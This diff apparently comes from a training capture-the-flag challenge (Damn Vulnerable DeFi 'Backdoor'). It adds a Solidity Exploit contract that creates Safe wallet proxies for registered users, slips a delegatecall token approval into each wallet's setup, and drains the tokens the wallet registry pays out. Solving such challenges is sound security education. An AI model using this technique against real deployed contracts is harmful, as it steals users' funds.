@@ -70,7 +70,9 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        Exploit ex = new Exploit(); 
+        ex.attack(users, token, singletonCopy, walletFactory, walletRegistry);
+        token.transfer(recovery, AMOUNT_TOKENS_DISTRIBUTED);
     }
 
     /**
@@ -92,5 +94,40 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract Exploit {
+    function attack(address[] memory _users, DamnValuableToken _token, Safe _singletonCopy, SafeProxyFactory _walletFactory, WalletRegistry _walletRegistry) external {
+        for (uint256 i = 0; i < _users.length; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = _users[i];
+            bytes memory initializers = abi.encodeWithSelector(
+                Safe.setup.selector, 
+                owners,
+                1,
+                address(this),
+                abi.encodeWithSelector(
+                    this.approve.selector, 
+                    address(_token),
+                    address(this)
+                ),
+                address(0),
+                address(0),
+                0,
+                address(0)
+            );
+            address proxy = address(_walletFactory.createProxyWithCallback(
+                address(_singletonCopy), 
+                initializers, 
+                uint256(0), 
+                _walletRegistry
+            ));
+            _token.transferFrom(proxy, msg.sender, 10e18);
+        }
+    }
+
+    function approve(address token, address spender) public {
+        DamnValuableToken(token).approve(spender, type(uint256).max);
     }
 }
